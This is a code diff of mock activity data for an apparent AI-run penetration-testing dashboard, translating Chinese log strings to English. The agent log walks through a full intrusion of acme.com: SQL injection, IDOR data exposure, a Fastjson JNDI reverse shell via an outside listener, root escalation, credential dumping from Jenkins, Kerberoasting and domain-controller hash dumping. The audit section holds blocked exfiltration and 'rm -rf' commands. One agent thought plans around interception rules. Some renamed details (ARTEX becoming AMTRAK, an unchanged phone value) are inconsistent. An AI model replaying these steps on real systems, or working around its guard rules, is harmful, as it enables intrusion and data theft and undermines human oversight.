+    summary: "upsert_asset x 6 (subdomains + services)",
   },
   {
     seq: 16,
@@ -1722,7 +1722,7 @@ export const activity: Activity[] = [
     intent_id: "i1",
     ts: T("2026-07-24T09:40:00Z"),
     kind: "result",
-    summary: "资产侦察完成，发现后台 admin.acme.com，交回图。",
+    summary: "Asset recon complete; discovered admin.acme.com and updated graph.",
     input_tokens: 96000,
     output_tokens: 6100,
     cache_read_tokens: 61000,
@@ -1736,7 +1736,7 @@ export const activity: Activity[] = [
     intent_id: "i2",
     ts: T("2026-07-26T03:31:00Z"),
     kind: "thinking",
-    summary: "后台是 Element-UI，登录接口无验证码、无速率限制。先试默认口令表，再上字典。",
+    summary: "Admin portal uses Element-UI with no CAPTCHA or rate limiting. Testing default credentials before wordlist.",
   },
   {
     seq: 21,
@@ -1757,7 +1757,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t21",
     summary: "401",
-    detail: "admin/admin 失败。",
+    detail: "admin/admin failed.",
   },
   {
     seq: 23,
@@ -1778,7 +1778,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t22",
     summary: "HTTP/1.1 302 Found\nSet-Cookie: session=eyJ…; HttpOnly\nLocation: /dashboard",
-    detail: "admin/admin123 登录成功，拿到会话 cookie。",
+    detail: "admin/admin123 succeeded; captured session cookie.",
   },
   {
     seq: 25,
@@ -1798,8 +1798,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t23",
-    summary: "<title>Acme Admin · 控制台",
-    detail: "确认已进入后台控制台。",
+    summary: "<title>Acme Admin · Console",
+    detail: "Confirmed access to the admin console.",
   },
   {
     seq: 27,
@@ -1819,7 +1819,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "report_finding",
     tool_use_id: "t24",
-    summary: "finding f-6 已记录，并连到目标 g1（proves）",
+    summary: "Recorded finding f-6 and linked it to goal g1 (proves)",
   },
   {
     seq: 29,
@@ -1827,7 +1827,7 @@ export const activity: Activity[] = [
     intent_id: "i2",
     ts: T("2026-07-26T03:50:00Z"),
     kind: "result",
-    summary: "后台默认口令确认，目标①达成。",
+    summary: "Admin default credentials confirmed; goal 1 achieved.",
     input_tokens: 72000,
     output_tokens: 4800,
     cache_read_tokens: 48000,
@@ -1841,7 +1841,7 @@ export const activity: Activity[] = [
     intent_id: "i4",
     ts: T("2026-07-25T22:01:00Z"),
     kind: "thinking",
-    summary: "search?q= 结果页把 q 拼进标题，先手工加单引号看报错。",
+    summary: "search?q= reflects q into the page heading; testing a single quote for SQL errors.",
   },
   {
     seq: 41,
@@ -1862,7 +1862,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t41",
     summary: "Unclosed quotation mark ... near '1'.",
-    detail: "MSSQL 报错型注入迹象。",
+    detail: "Signs of error-based MSSQL injection.",
   },
   {
     seq: 43,
@@ -1884,7 +1884,7 @@ export const activity: Activity[] = [
     tool_use_id: "t42",
     summary:
       "Parameter: q (GET) — error-based, MSSQL\navailable databases [4]: acme_prod, information_schema, master, tempdb",
-    detail: "确认可注入，枚举出 4 个库。",
+    detail: "Confirmed injectable; enumerated 4 databases.",
   },
   {
     seq: 45,
@@ -1904,7 +1904,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "report_finding",
     tool_use_id: "t43",
-    summary: "finding f-1 已记录",
+    summary: "Recorded finding f-1",
   },
   {
     seq: 47,
@@ -1912,7 +1912,7 @@ export const activity: Activity[] = [
     intent_id: "i4",
     ts: T("2026-07-26T01:20:00Z"),
     kind: "result",
-    summary: "SQL 注入确认。",
+    summary: "SQL injection confirmed.",
     input_tokens: 118000,
     output_tokens: 7400,
     cache_read_tokens: 82000,
@@ -1926,7 +1926,7 @@ export const activity: Activity[] = [
     intent_id: "i5",
     ts: T("2026-07-26T02:31:00Z"),
     kind: "thinking",
-    summary: "/v1/orders?id= 是数字自增 id，典型 IDOR 面。先取自己的单，再改 id 看能否读他人。",
+    summary: "/v1/orders?id= uses sequential numeric IDs (classic IDOR). Fetching own order first, then testing another ID.",
   },
   {
     seq: 51,
@@ -1947,7 +1947,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t51",
     summary: '{ "order_id":1001, "user_id":42, "amount":299 }',
-    detail: "自己的订单，正常。",
+    detail: "Own order returned as expected.",
   },
   {
     seq: 53,
@@ -1967,8 +1967,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t52",
-    summary: '{ "order_id":1002, "user_id":77, "amount":1299, "phone":"138****6021", "address":"北京市朝阳区 ****" }',
-    detail: "越权读到他人订单（含手机号/地址），无归属校验。",
+    summary: '{ "order_id":1002, "user_id":77, "amount":1299, "phone":"555-019-6021", "address":"742 Evergreen Terrace, Apt ****" }',
+    detail: "Read another user's order (phone/address) with no ownership check.",
   },
   {
     seq: 55,
@@ -1988,7 +1988,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "report_finding",
     tool_use_id: "t53",
-    summary: "finding f-2 已记录",
+    summary: "Recorded finding f-2",
   },
   {
     seq: 57,
@@ -1996,7 +1996,7 @@ export const activity: Activity[] = [
     intent_id: "i5",
     ts: T("2026-07-26T03:58:10Z"),
     kind: "thinking",
-    summary: "正在批量遍历 id 范围，评估可越权数据规模（暂不导出，避免触发拦截规则）。",
+    summary: "Probing ID range to estimate IDOR exposure scope (holding off on bulk export to avoid interception).",
   },
 
   // work#3 · i3 后台用户接口枚举（running）
@@ -2006,7 +2006,7 @@ export const activity: Activity[] = [
     intent_id: "i3",
     ts: T("2026-07-26T03:56:00Z"),
     kind: "thinking",
-    summary: "已有后台会话，枚举管理接口，找能批量导出用户敏感数据的入口（目标②）。",
+    summary: "Using active admin session to enumerate management endpoints for bulk user data access (goal 2).",
   },
   {
     seq: 61,
@@ -2027,7 +2027,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t61",
     summary: '{ "total": 12840, "items": [ { "id":1, "email":"a***@acme.com", "phone":"139****" } ] }',
-    detail: "管理接口可分页返回全部用户（含邮箱/手机号），约 1.28 万条。",
+    detail: "Admin API paginates all users (email/phone), ~12,800 records.",
   },
   {
     seq: 63,
@@ -2035,7 +2035,7 @@ export const activity: Activity[] = [
     intent_id: "i3",
     ts: T("2026-07-26T03:58:20Z"),
     kind: "thinking",
-    summary: "确认存在批量用户数据读取入口；导出动作命中破坏性/外泄规则，已提交拦截审批等待放行。",
+    summary: "Confirmed bulk user data endpoint; export matched exfiltration rule and is awaiting approval.",
   },
 
   // workG · ig .git 源码泄露与硬编码凭据（done）
@@ -2045,7 +2045,7 @@ export const activity: Activity[] = [
     intent_id: "ig",
     ts: T("2026-07-25T20:26:00Z"),
     kind: "thinking",
-    summary: "robots.txt 提到 /.git，先探测目录是否可下载，能拿源码就能白盒找注入点与硬编码密钥。",
+    summary: "robots.txt references /.git; checking if downloadable to inspect source and hardcoded secrets.",
   },
   {
     seq: 311,
@@ -2066,7 +2066,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "tg1",
     summary: "200",
-    detail: ".git 目录对外可访问。",
+    detail: ".git directory is publicly accessible.",
   },
   {
     seq: 313,
@@ -2086,8 +2086,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "tg2",
-    summary: "还原 214 个文件；HEAD=main。config.php / db.php 在列。",
-    detail: "完整后端源码已还原到 /tmp/acme。",
+    summary: "Recovered 214 files; HEAD=main. Includes config.php and db.php.",
+    detail: "Full backend source recovered to /tmp/acme.",
   },
   {
     seq: 315,
@@ -2108,7 +2108,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "tg3",
     summary: "$db_user='sa'; $db_pass='Acme@2021'; $db_host='10.10.10.30';",
-    detail: "硬编码数据库口令，且 host 指向内网 IP —— 记为疑似内网通用凭据。",
+    detail: "Hardcoded DB password pointing to an internal IP — flagged for internal credential reuse.",
   },
   {
     seq: 317,
@@ -2116,7 +2116,7 @@ export const activity: Activity[] = [
     intent_id: "ig",
     ts: T("2026-07-25T20:36:00Z"),
     kind: "result",
-    summary: "源码泄露 + 硬编码 DB 凭据确认，凭据入图供后续内网复用。",
+    summary: "Confirmed source exposure and hardcoded DB credentials; saved to graph for internal reuse.",
     input_tokens: 88000,
     output_tokens: 5200,
     cache_read_tokens: 60000,
@@ -2130,7 +2130,7 @@ export const activity: Activity[] = [
     intent_id: "i6",
     ts: T("2026-07-25T14:22:00Z"),
     kind: "thinking",
-    summary: "shop.acme.com 是自研电商，先指纹识别框架/组件版本，再对存在已知反序列化的组件下手。",
+    summary: "shop.acme.com is a custom storefront; fingerprinting framework versions for known deserialization flaws.",
   },
   {
     seq: 321,
@@ -2151,7 +2151,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t6a",
     summary: "X-Powered-By: Servlet\nSet-Cookie: JSESSIONID=...",
-    detail: "Java 技术栈，存在 /api/import 接受 JSON body。",
+    detail: "Java stack with /api/import accepting JSON payloads.",
   },
   {
     seq: 323,
@@ -2172,8 +2172,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t6b",
-    summary: "报错栈含 com.alibaba.fastjson.JSONException（1.2.24）",
-    detail: "确认 Fastjson 1.2.24 —— 对应 JdbcRowSetImpl JNDI 注入 RCE。",
+    summary: "Stack trace reveals com.alibaba.fastjson.JSONException (1.2.24)",
+    detail: "Confirmed Fastjson 1.2.24 — vulnerable to JdbcRowSetImpl JNDI RCE.",
   },
   {
     seq: 325,
@@ -2181,7 +2181,7 @@ export const activity: Activity[] = [
     intent_id: "i6",
     ts: T("2026-07-25T14:40:00Z"),
     kind: "result",
-    summary: "指纹命中 Fastjson 1.2.24，反序列化 RCE 面成立，交给利用意图。",
+    summary: "Fingerprinted Fastjson 1.2.24; passing RCE vector to exploitation intent.",
     input_tokens: 64000,
     output_tokens: 4100,
     cache_read_tokens: 42000,
@@ -2195,7 +2195,7 @@ export const activity: Activity[] = [
     intent_id: "i7",
     ts: T("2026-07-25T15:12:00Z"),
     kind: "thinking",
-    summary: "起一个 JNDI/LDAP 恶意服务，让 shop 反连加载执行 payload，先 dnslog 验证出网，再落反弹 shell。",
+    summary: "Start a JNDI/LDAP listener, verify outbound connectivity via DNSLog, then trigger reverse shell.",
   },
   {
     seq: 331,
@@ -2205,7 +2205,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t7a",
-    summary: "java -jar JNDIExploit.jar -i <vps> -l 1389 &  # 起 LDAP/HTTP 恶意服务",
+    summary: "java -jar JNDIExploit.jar -i <vps> -l 1389 &  # start LDAP/HTTP server",
   },
   {
     seq: 332,
@@ -2216,7 +2216,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t7a",
     summary: "LDAP Server started on 1389, HTTP on 8180",
-    detail: "恶意服务就绪。",
+    detail: "Exploit listener ready.",
   },
   {
     seq: 333,
@@ -2237,8 +2237,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t7b",
-    summary: "LDAP 收到请求 → 加载 ReverseShell → nc 监听收到连接",
-    detail: "payload 成功触发。",
+    summary: "LDAP request received -> loaded ReverseShell -> nc listener caught shell",
+    detail: "Payload triggered successfully.",
   },
   {
     seq: 335,
@@ -2248,7 +2248,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t7c",
-    summary: "id; hostname -I  # 反弹 shell 内确认身份与网段",
+    summary: "id; hostname -I  # verify identity and interfaces in shell",
   },
   {
     seq: 336,
@@ -2259,7 +2259,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t7c",
     summary: "uid=33(www-data) gid=33 groups=33\n10.0.20.15 10.10.10.15",
-    detail: "www-data@dmz-web01，且第二网卡 10.10.10.x —— 已进入 DMZ 且贴内网。",
+    detail: "www-data@dmz-web01 with second NIC on 10.10.10.x — inside DMZ with internal reachability.",
   },
   {
     seq: 337,
@@ -2277,7 +2277,7 @@ export const activity: Activity[] = [
     intent_id: "i7",
     ts: T("2026-07-25T15:40:00Z"),
     kind: "result",
-    summary: "反序列化 RCE 拿到 www-data 反弹 shell，目标③立足点初步建立。",
+    summary: "Deserialization RCE yielded www-data reverse shell; initial DMZ foothold established.",
     input_tokens: 132000,
     output_tokens: 8600,
     cache_read_tokens: 90000,
@@ -2291,7 +2291,7 @@ export const activity: Activity[] = [
     intent_id: "i8",
     ts: T("2026-07-25T16:02:00Z"),
     kind: "thinking",
-    summary: "www-data 权限有限，先做本地信息收集找提权点：sudo 配置、SUID、内核版本。",
+    summary: "www-data is low-privilege; checking sudo rules, SUID binaries, and kernel version for privesc.",
   },
   {
     seq: 341,
@@ -2312,7 +2312,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t8a",
     summary: "User www-data may run: (ALL) NOPASSWD: /usr/bin/python3",
-    detail: "sudo 白名单里 python3 且免密 —— 直接可提权。",
+    detail: "python3 allowed via sudo NOPASSWD — direct root escalation.",
   },
   {
     seq: 343,
@@ -2333,7 +2333,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t8b",
     summary: "uid=0(root) gid=0(root) groups=0(root)",
-    detail: "已提权 root。",
+    detail: "Escalated to root.",
   },
   {
     seq: 345,
@@ -2351,7 +2351,7 @@ export const activity: Activity[] = [
     intent_id: "i8",
     ts: T("2026-07-25T16:20:00Z"),
     kind: "result",
-    summary: "本地提权 root 完成，立足点稳固；准备以其为 pivot 打内网。",
+    summary: "Local root escalation complete; ready to pivot into internal network.",
     input_tokens: 74000,
     output_tokens: 4700,
     cache_read_tokens: 50000,
@@ -2365,7 +2365,7 @@ export const activity: Activity[] = [
     intent_id: "i9",
     ts: T("2026-07-25T20:32:00Z"),
     kind: "thinking",
-    summary: "立足点直连 10.10.10.0/24，用 fscan/内网扫描做主机与端口发现，圈定域控与高价值主机。",
+    summary: "Foothold directly reaches 10.10.10.0/24; scanning for DC and high-value internal hosts.",
   },
   {
     seq: 351,
@@ -2386,7 +2386,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t9a",
     summary: "DC01(10.10.10.10) 88/389/445\nFS01(10.10.10.5) 445\nJENKINS(10.10.10.20) 8080",
-    detail: "圈定域控 DC01、文件服务器 FS01、内部 Jenkins。",
+    detail: "Identified DC01 (Domain Controller), FS01 (file server), and internal Jenkins.",
   },
   {
     seq: 353,
@@ -2394,7 +2394,7 @@ export const activity: Activity[] = [
     intent_id: "i9",
     ts: T("2026-07-25T21:00:00Z"),
     kind: "result",
-    summary: "内网主机发现完成，3 台高价值目标入图。",
+    summary: "Internal host discovery complete; 3 high-value targets added to graph.",
     input_tokens: 82000,
     output_tokens: 5100,
     cache_read_tokens: 56000,
@@ -2408,7 +2408,7 @@ export const activity: Activity[] = [
     intent_id: "i10",
     ts: T("2026-07-26T03:42:00Z"),
     kind: "thinking",
-    summary: "源码泄露的 sa/Acme@2021 是 DB 口令，企业常见口令复用。对 DC01/FS01/JENKINS 做密码喷洒。",
+    summary: "Testing leaked sa/Acme@2021 credentials across DC01, FS01, and Jenkins for password reuse.",
   },
   {
     seq: 361,
@@ -2428,8 +2428,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t10a",
-    summary: "FS01 [+] acme.local\\sa:Acme@2021 (Pwn3d!)\nDC01 [-] 认证失败",
-    detail: "FS01 上 sa 口令复用成功且有管理员权限；DC01 不通。",
+    summary: "FS01 [+] acme.local\\sa:Acme@2021 (Pwn3d!)\nDC01 [-] Authentication failed",
+    detail: "Credential reuse succeeded with admin rights on FS01; failed on DC01.",
   },
   {
     seq: 363,
@@ -2437,7 +2437,7 @@ export const activity: Activity[] = [
     intent_id: "i10",
     ts: T("2026-07-26T03:50:00Z"),
     kind: "thinking",
-    summary: "FS01 已拿下，正在枚举共享目录寻找更多凭据和敏感文件……",
+    summary: "FS01 compromised; enumerating SMB shares for additional credentials and sensitive files...",
   },
 
   // work#11 · i11 Jenkins 未授权 RCE（done）
@@ -2447,7 +2447,7 @@ export const activity: Activity[] = [
     intent_id: "i11",
     ts: T("2026-07-25T21:32:00Z"),
     kind: "thinking",
-    summary: "JENKINS 8080 直接可访问，先看 /script 控制台是否需要认证。",
+    summary: "Jenkins on port 8080 is reachable; checking if /script console requires authentication.",
   },
   {
     seq: 371,
@@ -2468,7 +2468,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11a",
     summary: "200",
-    detail: "Script Console 无需登录即可访问。",
+    detail: "Script Console is accessible without authentication.",
   },
   {
     seq: 373,
@@ -2489,7 +2489,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11b",
     summary: "nt authority\\system",
-    detail: "Groovy 以 SYSTEM 权限执行。",
+    detail: "Groovy executes as SYSTEM.",
   },
   {
     seq: 375,
@@ -2499,7 +2499,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t11c",
-    summary: "curl -s -d 'script=...' http://10.10.10.20:8080/scriptText  # 导出 Jenkins 凭据库",
+    summary: "curl -s -d 'script=...' http://10.10.10.20:8080/scriptText  # dump Jenkins credentials store",
   },
   {
     seq: 376,
@@ -2510,7 +2510,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11c",
     summary: "acme\\svc_deploy : Deploy@Acme2024\nacme\\svc_build : Build#2023!",
-    detail: "两个域服务账号明文口令导出。",
+    detail: "Extracted plaintext passwords for two domain service accounts.",
   },
   {
     seq: 377,
@@ -2528,7 +2528,7 @@ export const activity: Activity[] = [
     intent_id: "i11",
     ts: T("2026-07-25T21:50:00Z"),
     kind: "result",
-    summary: "Jenkins 未授权 RCE 确认，并导出两个域服务账号凭据。",
+    summary: "Confirmed unauthenticated Jenkins RCE and extracted two domain service account credentials.",
     input_tokens: 96000,
     output_tokens: 6200,
     cache_read_tokens: 64000,
@@ -2542,7 +2542,7 @@ export const activity: Activity[] = [
     intent_id: "i12",
     ts: T("2026-07-25T22:42:00Z"),
     kind: "thinking",
-    summary: "用 svc_deploy 凭据做域认证，然后 GetUserSPNs 请求可 Kerberoast 的服务账号 TGS。",
+    summary: "Authenticate to AD with svc_deploy and run GetUserSPNs to request Kerberoastable TGS tickets.",
   },
   {
     seq: 381,
@@ -2563,7 +2563,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t12a",
     summary: "svc_sql  MSSQLSvc/db01.acme.local:1433  $krb5tgs$23$*svc_sql$...",
-    detail: "拿到 svc_sql 的 TGS 票据（Kerberos RC4）。",
+    detail: "Captured TGS ticket for svc_sql (Kerberos RC4).",
   },
   {
     seq: 383,
@@ -2584,7 +2584,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t12b",
     summary: "$krb5tgs$23$*svc_sql$...:Sql@2020",
-    detail: "8 分钟破出口令 Sql@2020。",
+    detail: "Cracked password Sql@2020 in 8 minutes.",
   },
   {
     seq: 385,
@@ -2602,7 +2602,7 @@ export const activity: Activity[] = [
     intent_id: "i12",
     ts: T("2026-07-25T23:20:00Z"),
     kind: "result",
-    summary: "Kerberoasting 破出 svc_sql 口令，入图供域控攻击使用。",
+    summary: "Kerberoasting cracked svc_sql password; recorded to graph for DC attack.",
     input_tokens: 108000,
     output_tokens: 6800,
     cache_read_tokens: 72000,
@@ -2616,7 +2616,7 @@ export const activity: Activity[] = [
     intent_id: "i13",
     ts: T("2026-07-25T23:52:00Z"),
     kind: "thinking",
-    summary: "svc_deploy 来自 Jenkins 凭据库，先查组成员资格——若属于 Domain Admins 就可直接 psexec DC01。",
+    summary: "Checking group membership for svc_deploy — if Domain Admins, can psexec directly to DC01.",
   },
   {
     seq: 391,
@@ -2637,7 +2637,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t13a",
     summary: "ACME\\Administrator\nACME\\svc_deploy",
-    detail: "svc_deploy 是 Domain Admins 成员。",
+    detail: "svc_deploy is a member of Domain Admins.",
   },
   {
     seq: 393,
@@ -2658,7 +2658,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t13b",
     summary: "C:\\Windows\\system32> whoami\nnt authority\\system",
-    detail: "以 SYSTEM 身份登录域控 DC01。",
+    detail: "Authenticated to DC01 as SYSTEM.",
   },
   {
     seq: 395,
@@ -2679,7 +2679,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t13c",
     summary: "Administrator:500:aad3b435...:::  krbtgt:502:aad3b435...:::",
-    detail: "全域 NTLM 哈希导出（含 krbtgt），可制作黄金票据持久控制。",
+    detail: "Dumped all domain NTLM hashes including krbtgt, enabling Golden Ticket persistence.",
   },
   {
     seq: 397,
@@ -2697,7 +2697,7 @@ export const activity: Activity[] = [
     intent_id: "i13",
     ts: T("2026-07-26T00:20:00Z"),
     kind: "result",
-    summary: "域控 DC01 拿下，secretsdump 导出全域哈希，靶标达成。",
+    summary: "DC01 compromised and full domain hashes dumped via secretsdump; objective achieved.",
     input_tokens: 144000,
     output_tokens: 9200,
     cache_read_tokens: 96000,
@@ -2705,30 +2705,30 @@ export const activity: Activity[] = [
   },
 
   // 主 agent（人在环路对话）
-  { seq: 70, worker: "mainagent", ts: T("2026-07-26T03:18:00Z"), kind: "user", summary: "后台先从哪切入？" },
+  { seq: 70, worker: "mainagent", ts: T("2026-07-26T03:18:00Z"), kind: "user", summary: "Where should we start on the admin portal?" },
   {
     seq: 71,
     worker: "mainagent",
     ts: T("2026-07-26T03:18:06Z"),
     kind: "text",
     summary:
-      "admin.acme.com 是 Element-UI 后台，无验证码、无速率限制。建议先默认口令表(admin/admin123)再上字典。我已注入一条高优意图给 work agent。",
+      "admin.acme.com is an Element-UI admin portal with no CAPTCHA or rate limiting. Recommend trying default credentials (admin/admin123) first, then a wordlist. I injected a high-priority intent for the worker agent.",
   },
-  { seq: 72, worker: "mainagent", ts: T("2026-07-26T03:52:00Z"), kind: "user", summary: "拿到后台了，接下来重点？" },
+  { seq: 72, worker: "mainagent", ts: T("2026-07-26T03:52:00Z"), kind: "user", summary: "We have admin access — what should we focus on next?" },
   {
     seq: 73,
     worker: "mainagent",
     ts: T("2026-07-26T03:52:08Z"),
     kind: "text",
     summary:
-      "目标②是读用户敏感数据：并行推进「后台用户接口枚举」与「API IDOR」。注意批量导出会触发拦截规则，需要你审批放行。",
+      "Goal 2 is sensitive user data access: run admin user endpoint enumeration and API IDOR in parallel. Note that bulk export will trigger an interception rule requiring your approval.",
   },
   {
     seq: 400,
     worker: "mainagent",
     ts: T("2026-07-25T15:42:00Z"),
     kind: "user",
-    summary: "shell 拿到了，下一步怎么打？",
+    summary: "Got a shell — what is the next move?",
   },
   {
     seq: 401,
@@ -2736,14 +2736,14 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T15:42:10Z"),
     kind: "text",
     summary:
-      "www-data 权限不够，先提权（sudo -l 看起来有戏）。拿到 root 后以 DMZ 为跳板做内网发现，优先域控和 Jenkins。",
+      "www-data has limited privileges — escalate locally first (sudo -l looks promising). Once root, pivot from the DMZ host to scan the internal subnet, prioritizing DC and Jenkins.",
   },
   {
     seq: 402,
     worker: "mainagent",
     ts: T("2026-07-25T21:22:00Z"),
     kind: "user",
-    summary: "内网扫完了，Jenkins 那台看起来有未授权？",
+    summary: "Internal scan finished — does Jenkins look unauthenticated?",
   },
   {
     seq: 403,
@@ -2751,16 +2751,16 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T21:22:08Z"),
     kind: "text",
     summary:
-      "对，/script 无鉴权直接 Groovy RCE。我已注入一条提示让 worker 优先打 Jenkins —— 拿下后可以导出域凭据，再配合 Kerberoasting 打域控。",
+      "Yes, /script is unauthenticated and allows Groovy RCE. I injected a hint to prioritize Jenkins so we can extract domain credentials and pivot to the DC.",
   },
-  { seq: 404, worker: "mainagent", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "DC01 拿下了？给个总结。" },
+  { seq: 404, worker: "mainagent", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "Is DC01 compromised? Give me a summary." },
   {
     seq: 405,
     worker: "mainagent",
     ts: T("2026-07-26T00:22:12Z"),
     kind: "text",
     summary:
-      "确认拿下。攻击路径：shop Fastjson RCE → DMZ 提权 → 内网 Jenkins 导出域凭据 → svc_deploy 属 Domain Admins → psexec DC01 SYSTEM → secretsdump 全域哈希。四个目标全部达成或推进中。",
+      "Confirmed. Kill chain: shop Fastjson RCE -> DMZ root privesc -> internal Jenkins credential dump -> svc_deploy (Domain Admins) -> psexec DC01 as SYSTEM -> secretsdump full domain hashes. All four goals are achieved or in final verification.",
   },
 ];
 
@@ -2932,7 +2932,7 @@ Content-Length: 655
   "order_id": 1002,
   "user_id": 77,
   "amount": 1299.00,
-  "address": "北京市朝阳区 ****",
+  "address": "742 Evergreen Terrace, Apt ****",
   "phone": "138****6021",
   "items": [{ "sku": "A-100", "qty": 1 }]
 }`,
@@ -2958,7 +2958,7 @@ export const audit: Audit = {
       ts: T("2026-07-26T02:10:00Z"),
       tool: "bash",
       action: "block",
-      reason: "目标越界：out.evil.example 不在 scope 内",
+      reason: "Out of scope: out.evil.example is outside authorized targets",
       command: "curl https://out.evil.example/exfil",
     },
     {
@@ -2971,7 +2971,7 @@ export const audit: Audit = {
       ts: T("2026-07-25T21:00:00Z"),
       tool: "bash",
       action: "block",
-      reason: "破坏性命令门控：rm -rf 被拒绝",
+      reason: "Destructive command guard: rm -rf denied",
       command: "rm -rf /var/www",
     },
     {
@@ -3003,14 +3003,14 @@ export const audit: Audit = {
       ts: T("2026-07-26T00:05:00Z"),
       tool: "bash",
       action: "block",
-      reason: "数据外泄门控：secretsdump 需人工审批",
+      reason: "Data exfiltration guard: secretsdump requires manual approval",
       command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc",
     },
     {
       ts: T("2026-07-26T00:06:00Z"),
       tool: "bash",
       action: "allow",
-      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc  # 已审批放行",
+      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc  # approved",
     },
   ],
 };
@@ -3075,11 +3075,11 @@ export const agents: Agent[] = [
   {
     id: "1001",
     key: "retester",
-    name: "漏洞复测",
+    name: "Finding Retester",
     role: "assistant",
     builtin: false,
     enabled: true,
-    description: "从漏洞详情手动启动，保存独立复测结论",
+    description: "Manually triggered from finding details to record independent retest results",
     max_turns: 0,
     mcp_count: 0,
     skill_count: 0,
@@ -3088,11 +3088,11 @@ export const agents: Agent[] = [
   {
     id: "1",
     key: "goals",
-    name: "目标拆解器",
+    name: "Goal Decomposer",
     role: "goals",
     builtin: true,
     enabled: true,
-    description: "把任务目标拆成可探索的子目标",
+    description: "Breaks task objectives into actionable sub-goals",
     max_turns: 8,
     mcp_count: 0,
     skill_count: 1,
@@ -3101,11 +3101,11 @@ export const agents: Agent[] = [
   {
     id: "2",
     key: "planner",
-    name: "规划者",
+    name: "Planner",
     role: "planner",
     builtin: true,
     enabled: true,
-    description: "读探索路线、判断目标达成、生成意图",
+    description: "Reviews exploration lineage, verifies goals, and dispatches intents",
     max_turns: 0,
     mcp_count: 1,
     skill_count: 2,
@@ -3114,11 +3114,11 @@ export const agents: Agent[] = [
   {
     id: "3",
     key: "mainagent",
-    name: "主 Agent",
+    name: "Main Agent",
     role: "mainagent",
     builtin: true,
     enabled: true,
-    description: "人在环路对话，注入 hint / 高优意图",
+    description: "Human-in-the-loop chat for injecting hints and high-priority intents",
     max_turns: 0,
     web_search: true,
     mcp_count: 2,
@@ -3132,7 +3132,7 @@ export const agents: Agent[] = [
     role: "worker",
     builtin: true,
     enabled: true,
-    description: "claim 意图 → 跑 Kali 工具 → 图写回",
+    description: "Claims intents -> executes Kali tools -> writes findings back to graph",
     max_turns: 40,
     run_seconds: 1800,
     web_search: false,
@@ -3144,11 +3144,11 @@ export const agents: Agent[] = [
   {
     id: "5",
     key: "recon-bot",
-    name: "侦察机器人（自定义）",
+    name: "Recon Bot (Custom)",
     role: "custom",
     builtin: false,
     enabled: true,
-    description: "定时对新资产做被动侦察",
+    description: "Runs scheduled passive reconnaissance on newly discovered assets",
     max_turns: 12,
     mcp_count: 1,
     skill_count: 1,
@@ -3157,30 +3157,30 @@ export const agents: Agent[] = [
 ];
 
 const promptVars: PromptVar[] = [
-  { name: "Goal", description: "当前任务目标", example: "拿到 acme.com 后台管理权限", source: "runtime" },
-  { name: "AssetSummary", description: "资产图概览", example: "6 子域 / 3 IP / 4 应用 / 4 端点", source: "distilled" },
-  { name: "RouteHint", description: "探索路线提示", example: "优先后台与 API 越权面", source: "exploration" },
+  { name: "Goal", description: "Current task objective", example: "Gain administrative access to acme.com", source: "runtime" },
+  { name: "AssetSummary", description: "Asset graph summary", example: "6 subdomains / 3 IPs / 4 apps / 4 endpoints", source: "distilled" },
+  { name: "RouteHint", description: "Exploration routing hint", example: "Prioritize admin portal and API authorization surface", source: "exploration" },
 ];
 
 const promptVersions: PromptVersion[] = [
-  { version: 3, ts: T("2026-07-25T10:00:00Z"), note: "加强越权探测引导", template_text: "你是 ARTEX 的规划者……" },
-  { version: 2, ts: T("2026-07-20T10:00:00Z"), note: "初版微调", template_text: "你是 ARTEX 的规划者(v2)……" },
+  { version: 3, ts: T("2026-07-25T10:00:00Z"), note: "Improved authorization testing guidance", template_text: "You are the AMTRAK Planner..." },
+  { version: 2, ts: T("2026-07-20T10:00:00Z"), note: "Initial prompt tuning", template_text: "You are the AMTRAK Planner (v2)..." },
 ];
 
 export function agentDetail(key: string): AgentDetail {
